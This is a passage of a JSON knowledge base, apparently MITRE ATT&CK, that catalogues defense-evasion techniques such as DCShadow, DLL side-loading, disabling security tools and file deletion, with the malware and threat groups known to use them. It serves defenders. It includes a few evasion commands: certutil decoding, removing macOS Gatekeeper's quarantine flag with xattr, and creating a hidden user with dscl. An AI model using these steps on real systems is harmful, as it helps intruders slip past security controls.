                    "Description": "Regin stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.[25]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM samples have been signed with a code-signing certificates.[26]"
                },
                {
                    "Name": "SDelete",
                    "Description": "SDelete is digitally signed by Microsoft.[27]"
                },
                {
                    "Name": "Suckfly",
                    "Description": "Suckfly has used stolen certificates to sign its malware.[28]"
                },
                {
                    "Name": "Winnti Group",
                    "Description": "Winnti Group used stolen certificates to sign its malware.[29]"
                }
            ]
        },
        "DCShadow": {
            "Name": "DCShadow",
            "Description": "DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a Domain Controller (DC). [1] [2] Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. [3]This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). [1] The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. [1] [2]\n",
            "ID": "T1207",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator",
            "Data Sources: ": "API monitoring, Authentication logs, Network protocol analysis, Packet capture",
            "Defense Bypassed: ": "Log analysis",
            "Contributors: ": "Vincent Le Toux",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Mimikatz",
                    "Description": "Mimikatz’s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC.[4][3]"
                }
            ]
        },
        "Deobfuscate/Decode Files or Information": {
            "Name": "Deobfuscate/Decode Files or Information",
            "Description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, Scripting, PowerShell, or by using utilities present on the system.One such example is use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. [1]Another example is using the Windows copy /b command to reassemble binary fragments into a malicious payload. [2]Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used with Obfuscated Files or Information during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. [3] Adversaries may also used compressed or archived scripts, such as Javascript.\n",
            "ID": "T1140",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Defense Bypassed: ": "Anti-virus, Host intrusion prevention systems, Signature-based detection, Network intrusion detection system",
            "Contributors: ": "Matthew Demaske, Adaptforward; Red Canary",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT19",
                    "Description": "An APT19 HTTP malware variant decrypts strings using single-byte XOR keys.[4]"
                },
                {
                    "Name": "APT28",
                    "Description": "An APT28 macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.[5][6]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot decodes embedded XOR strings.[7]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal decodes strings in the malware using XOR and RC4.[8]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER downloads encoded payloads and decodes them on the victim.[9]"
                },
                {
                    "Name": "certutil",
                    "Description": "certutil has been used to decode binaries hidden inside certificate files as Base64 information.[1]"
                },
                {
                    "Name": "DDKONG",
                    "Description": "DDKONG decodes an embedded configuration using XOR.[10]"
                },
                {
                    "Name": "Dyre",
                    "Description": "Dyre decrypts resources needed for targeting the victim.[11]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher extracts and decrypts stage 3 malware, which is stored in encrypted resources.[12][13]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can decode contents from a payload that was Base64 encoded and write the contents to a file.[14]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee drops a Word file containing a Base64-encoded file in it that is read, decoded, and dropped to the disk by the macro.[15]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can decrypt, unpack and load a DLL from its resources.[16]"
                },
                {
                    "Name": "ISMInjector",
                    "Description": "ISMInjector uses the certutil command to decode a payload file.[17]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs decrypts and extracts a copy of its main DLL payload when executing.[18]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.[19]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has used certutil -decode to decode files on the victim’s machine when dropping UPPERCUT.[20][21]"
                },
                {
                    "Name": "MirageFox",
                    "Description": "MirageFox has a function for decrypting data containing C2 configuration information.[22]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater decoded base64-encoded PowerShell commands using a VBS file.[23][24]"
                },
                {
                    "Name": "OilRig",
                    "Description": "A OilRig macro has run a PowerShell command to decode file contents. OilRig has also used certutil to decode base64-encoded files on victims.[25][17][26]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE concatenates then decompresses multiple resources to load an embedded .Net Framework assembly.[26]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton uses an encrypted file to store commands and configuration values.[27]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.[28]"
                },
                {
                    "Name": "RGDoor",
                    "Description": "RGDoor decodes Base64 strings and decrypts strings using a custom XOR algorithm.[29]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader deobfuscates its code.[30]"
                },
                {
                    "Name": "Starloader",
                    "Description": "Starloader decrypts and executes shellcode from a file called Stars.jps.[31]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "During execution, Threat Group-3390 malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.[32]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot decodes the configuration data and modules.[33]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "One TYPEFRAME variant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value \"0x35\".[34]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN decrypts code, strings, and commands to use once it's on the victim's machine.[35]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer deobfuscates its strings and APIs once its executed.[36]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT shellcode decrypts and decompresses its RC4-encrypted payload.[37]"
                }
            ]
        },
        "Disabling Security Tools": {
            "Name": "Disabling Security Tools",
            "Description": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.\n",
            "ID": "T1089",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "API monitoring, File monitoring, Services, Windows Registry, Process command-line parameters, Anti-virus",
            "Defense Bypassed: ": "File monitoring, Host intrusion prevention systems, Signature-based detection, Log analysis, Anti-virus",
            "CAPEC ID: ": "CAPEC-578",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "BACKSPACE",
                    "Description": "The \"ZR\" variant of BACKSPACE will check to see if known host-based firewalls are installed on the infected systems. BACKSPACE will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.[1]"
                },
                {
                    "Name": "BADCALL",
                    "Description": "BADCALL disables the Windows firewall before binding to a port.[2]"
                },
                {
                    "Name": "Brave Prince",
                    "Description": "Brave Prince terminates antimalware processes.[3]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak may use netsh to add local firewall rule exceptions.[4]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes can alter the victim's proxy configuration.[5]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 has disabled host-based firewalls. The group has also globally opened port 3389.[6][7]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon terminates anti-malware processes if they’re found running on the system.[3]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.[8]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 kills and disables services for Windows Firewall, Windows Security Center, and Windows Defender.[9]"
                },
                {
                    "Name": "HARDRAIN",
                    "Description": "HARDRAIN opens the Windows Firewall to modify incoming connections.[10]"
                },
                {
                    "Name": "HDoor",
                    "Description": "HDoor kills anti-virus found on the victim.[11]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole has a command to disable routing and the Firewall on the victim’s machine.[12]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN lower disable security settings by changing Registry keys.[13]"
                },
                {
                    "Name": "Kasidet",
                    "Description": "Kasidet has the ability to change firewall settings to allow a plug-in to be downloaded.[14]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh. Lazarus Group malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, Lazarus Group malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.[15][16][17][18]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu can change Internet Explorer settings to reduce warnings about malware activity.[19]"
                },
                {
                    "Name": "netsh",
                    "Description": "netsh can be used to disable local firewall settings.[20][21]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can disable Microsoft Office Protected View by changing Registry keys.[22]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton kills security tools like Wireshark that are running.[23]"
                },
                {
                    "Name": "Putter Panda",
                    "Description": "Malware used by Putter Panda attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).[24]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can add or remove applications or ports on the Windows firewall or disable it entirely.[25]"
                },
                {
                    "Name": "RunningRAT",
                    "Description": "RunningRAT kills antimalware running process.[3]"
                },
                {
                    "Name": "SslMM",
                    "Description": "SslMM identifies and kills anti-malware processes.[11]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has used appcmd.exe to disable logging on a victim server.[26]"
                },
                {
                    "Name": "TinyZBot",
                    "Description": "TinyZBot can disable Avira anti-virus.[27]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME can open the Windows Firewall on the victim’s machine to allow incoming connections.[28]"
                },
                {
                    "Name": "Unknown Logger",
                    "Description": "Unknown Logger has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.[29]"
                }
            ]
        },
        "DLL Side-Loading": {
            "Name": "DLL Side-Loading",
            "Description": "Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests [1] are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL. [2]Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.\n",
            "ID": "T1073",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Data Sources: ": "Process use of network, Process monitoring, Loaded DLLs",
            "Defense Bypassed: ": "Process whitelisting, Anti-virus",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT19",
                    "Description": "APT19 launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.[3]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has been known to side load DLLs with a valid version of Chrome with one of their tools.[4][5]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 ran genuinely-signed executables from Symantec and McAfee which loaded a malicious DLL called rastls.dll.[6]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS typically loads its DLL file into a legitimate signed Java or VMware executable.[7][8]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "DLL side-loading has been used to execute BBSRAT through a legitimate Citrix executable ssonsvr.exe which is vulnerable to the technique. The Citrix executable was dropped along with BBSRAT by the dropper.[9]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher uses DLL side-loading to load malicious programs.[10][11]"
                },
                {
                    "Name": "gh0st",
                    "Description": "A gh0st variant has used DLL side-loading.[12]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser has used DLL side-loading.[13]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT.[14][15]"
                },
                {
                    "Name": "OwaAuth",
                    "Description": "OwaAuth has been loaded onto Exchange servers and disguised as an ISAPI filter (DLL file). The IIS w3wp.exe process then loads the malicious DLL.[13]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "A Patchwork .dll that contains BADNEWS is loaded and executed using DLL side-loading.[16]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX has used to use DLL side-loading to evade anti-virus and to maintain persistence on a victim.[5][13][2][14][17]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Sakula uses DLL side-loading, typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.[18]"
                },
                {
                    "Name": "T9000",
                    "Description": "During the T9000 installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.[19]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 actors have used DLL side-loading. Actors have used legitimate Kaspersky anti-virus variants in which the DLL acts as a stub loader that loads and executes the shell code.[13][20][21]"
                },
                {
                    "Name": "Wingbird",
                    "Description": "Wingbird side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.[22][23]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT has used DLL side-loading to load malicious payloads.[24][25]"
                }
            ]
        },
        "Exploitation for Defense Evasion": {
            "Name": "Exploitation for Defense Evasion",
            "Description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for Security Software Discovery. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n",
            "ID": "T1211",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Windows Error Reporting, Process monitoring, File monitoring",
            "Defense Bypassed: ": "Anti-virus, System access controls",
            "Contributors: ": "John Lambert, Microsoft Threat Intelligence Center",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 has used CVE-2015-4902 to bypass security features.[1][2]"
                }
            ]
        },
        "File Deletion": {
            "Name": "File Deletion",
            "Description": "Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native cmd functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. [1]\n",
            "ID": "T1107",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Process command-line parameters, Binary file metadata",
            "Defense Bypassed: ": "Host forensic analysis",
            "Contributors: ": "Walker Johnson",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL can delete files and directories.[2]"
                },
                {
                    "Name": "APT18",
                    "Description": "APT18 actors deleted tools and batch files from victim systems.[3]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.[4]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that can delete files.[5]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).[6][7]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Backdoor.Oldrea contains a cleanup module that removes traces of itself from the victim.[8]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.[9]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT can delete files and directories.[10]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal deletes its dropper and VBS scripts from the victim’s machine.[11]"
                },
                {
                    "Name": "BLACKCOFFEE",
                    "Description": "BLACKCOFFEE has the capability to delete files.[12]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy 2 contains a \"Destroy\" plug-in that destroys data stored on victim hard drives by overwriting file contents.[13]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "The BRONZE BUTLER uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.[14]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto has the capability to use rm -rf to remove folders and files from the victim's machine.[15]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak has a command to delete files.[16]"
                },
                {
                    "Name": "Cherry Picker",
                    "Description": "Recent versions of Cherry Picker delete files and registry keys created by the malware.[17]"
                },
                {
                    "Name": "cmd",
                    "Description": "cmd can be used to delete files from the file system.[18]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group deleted the DLL dropper from the victim’s machine to cover their tracks.[19]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.[20][21]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.[22][23]"
                },
                {
                    "Name": "FALLCHILL",
                    "Description": "FALLCHILL can delete malware and associated artifacts from the victim.[24]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT deletes the .LNK file from the startup directory as well as the dropper components.[25]"
                },
                {
                    "Name": "FIN10",
                    "Description": "FIN10 has used batch scripts and scheduled tasks to delete critical system files.[26]"
                },
                {
                    "Name": "FIN5",
                    "Description": "FIN5 uses SDelete to clean up the environment and attempt to prevent detection.[27]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has deleted tmp and prefetch files during post compromise cleanup activities.[28]"
                },
                {
                    "Name": "FruitFly",
                    "Description": "FruitFly will delete files on the system.[29]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer has commands to delete files and persistence mechanisms from the victim.[30][31]"
                },
                {
                    "Name": "gh0st",
                    "Description": "gh0st RAT is able to delete files.[32]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon deletes one of its files, 2.hwp, from the endpoint after establishing persistence.[33]"
                },
                {
                    "Name": "Group5",
                    "Description": "Malware used by Group5 is capable of remotely deleting files from victims.[34]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 deletes shadow copies from the victim.[35]"
                },
                {
                    "Name": "HALFBAKED",
                    "Description": "HALFBAKED can delete a specified file.[36]"
                },
                {
                    "Name": "Hi-Zor",
                    "Description": "Hi-Zor deletes its RAT installer file as it executes its DLL payload file.[37]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee removes batch files to reduce fingerprint on the system as well as deletes the CAB file that gets encoded upon infection.[38]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser deletes its original installer file once installation is complete.[39]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can delete files.[40][41]"
                },
                {
                    "Name": "InnaputRAT",
                    "Description": "InnaputRAT has a command to delete files.[42]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole has a command to delete a file and deletes files after they have been successfully uploaded to C2 servers.[43]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "The JHUHUGIT dropper can delete itself from the victim. Another JHUHUGIT variant has the capability to delete specified files.[44][45]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN's installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.[46]"
                },
                {
                    "Name": "jRAT",
                    "Description": "jRAT has a function to delete files from the victim’s machine.[47]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar can delete files and optionally overwrite with random data beforehand.[48]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE has the capability to delete files off the victim’s machine.[49]"
                },
                {
                    "Name": "Komplex",
                    "Description": "The Komplex trojan supports file deletion.[50]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware deletes files in various ways, including \"suicide scripts\" to delete malware binaries from the victim. Lazarus Group also uses secure file deletion to delete files from the victim. Additionally, Lazarus Group malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine.[51][52][53]"
                },
                {
                    "Name": "Linfo",
                    "Description": "Linfo creates a backdoor through which remote attackers can delete files.[54]"
                },
                {
                    "Name": "MacSpy",
                    "Description": "MacSpy deletes any temporary files it creates[55]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound has deleted and overwrote files to cover tracks.[56][57]"
                },
                {
                    "Name": "menuPass",
                    "Description": "A menuPass macro deletes files after it has decoded and decompressed them.[58]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Misdat is capable of deleting the backdoor file.[59]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind can delete itself or specified files.[60]"
                },
                {
                    "Name": "More_eggs",
                    "Description": "More_eggs can remove itself from a system.[19]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito deletes files using DeleteFileW API call.[61]"
                },
                {
                    "Name": "MURKYTOP",
                    "Description": "has the capability to delete local files.[21]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu launches a script to delete their original decoy file to cover tracks.[62]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has deleted files associated with their payload after execution.[63][64]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE has the capability to delete files and scripts from the victim's machine.[65]"
                },
                {
                    "Name": "Pasam",
                    "Description": "Pasam creates a backdoor through which remote attackers can delete files.[66]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork removed certain files and replaced them so they could not be retrieved.[67]"
                },
                {
                    "Name": "pngdowner",
                    "Description": "pngdowner deletes content from C2 communications that was saved to the user's temporary directory.[68]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke has a command to write random data across a file and delete it.[69]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can wipe drives using PowerShell Remove-Item commands.[70]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton removes all files in the /tmp directory.[29]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc can wipe files indicated by the attacker and remove itself from disk using a batch file.[52]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.[71]"
                },
                {
                    "Name": "PUNCHBUGGY",
                    "Description": "PUNCHBUGGY can delete files written to disk.[28]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT has a command to delete its Registry key and scheduled task.[72]"
                },
                {
                    "Name": "Reaver",
                    "Description": "Reaver deletes the original dropped file from the victim.[73]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can delete specified files.[74]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.[75][76][77]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can delete all files created during its execution.[78]"
                },
                {
                    "Name": "RunningRAT",
                    "Description": "RunningRAT contains code to delete files from the victim’s machine.[33]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Some Sakula samples use cmd.exe to delete temporary files.[79]"
                },
                {
                    "Name": "SDelete",
                    "Description": "SDelete deletes data in a way that makes it unrecoverable.[80]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke can securely delete files, including deleting itself from the victim.[81]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon attempts to overwrite operating system files with image files.[82][83]"
                },
                {
                    "Name": "TDTESS",
                    "Description": "TDTESS creates then deletes log files during installation of itself as a service.[84]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has deleted existing logs and exfiltrated file archives from a victim.[85]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME can delete files off the system.[86]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "USBStealer has several commands to delete files associated with the malware from the victim.[87]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN can delete files on the victim’s machine.[88]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer can delete files and itself after infection to avoid analysis.[89]"
                },
                {
                    "Name": "WINDSHIELD",
                    "Description": "WINDSHIELD is capable of file deletion along with other file system interaction.[90]"
                },
                {
                    "Name": "Wingbird",
                    "Description": "Wingbird deletes its payload along with the payload's parent process after it finishes copying files.[91]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.[92]"
                }
            ]
        },
        "File Permissions Modification": {
            "Name": "File Permissions Modification",
            "Description": "File permissions are commonly managed by discretionary access control lists (DACLs) specified by the file owner. File DACL implementation may vary by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.). [1] [2] [3]Adversaries may modify file permissions/attributes to evade intended DACLs. [4] [5] Modifications may include changing specific access rights, which may require taking ownership of a file and/or elevated permissions such as Administrator/root depending on the file's existing permissions to enable malicious activity such as modifying, replacing, or deleting specific files. Specific file modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Logon Scripts, or tainting/hijacking other instrumental binary/configuration files.\n",
            "ID": "T1222",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "User, Administrator, SYSTEM, root",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters, Windows event logs",
            "Defense Bypassed: ": "File system access controls",
            "Contributors: ": "Jan Miller, CrowdStrike",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "JPIN",
                    "Description": "JPIN can use the command-line utility cacls.exe to change file permissions.[6]"
                }
            ]
        },
        "File System Logical Offsets": {
            "Name": "File System Logical Offsets",
            "Description": "Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. [1]Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. [2]\n",
            "ID": "T1006",
            "Tactic": "Defense Evasion",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator",
            "Data Sources: ": "API monitoring",
            "Defense Bypassed: ": "File monitoring, File system access controls",
            "Version": "1.0"
        },
        "Gatekeeper Bypass": {
            "Name": "Gatekeeper Bypass",
            "Description": "In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called com.apple.quarantine. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, other utilities or events like drive-by downloads don’t necessarily set it either. This completely bypasses the built-in Gatekeeper check. [1] The presence of the quarantine flag can be checked by the xattr command xattr /path/to/MyApp.app for com.apple.quarantine. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app. [2] [3]In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. [4]\n",
            "ID": "T1144",
            "Tactic": "Defense Evasion",
            "Platform: ": "macOS",
            "Permissions Required: ": "User, Administrator",
            "Defense Bypassed: ": "Application whitelisting, Anti-virus",
            "Version": "1.0"
        },
        "Hidden Users": {
            "Name": "Hidden Users",
            "Description": "Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in /Library/Preferences/com.apple.loginwindow called Hide500Users that prevents users with userIDs 500 and lower from appearing at the login screen. By using the Create Account technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: sudo dscl . -create /Users/username UniqueID 401 [1].\n",
            "ID": "T1147",
            "Tactic": "Defense Evasion",
            "Platform: ": "macOS",
            "Permissions Required: ": "Administrator, root",
            "Data Sources: ": "Authentication logs, File monitoring",
            "Version": "1.0"
        },
        "Hidden Window": {
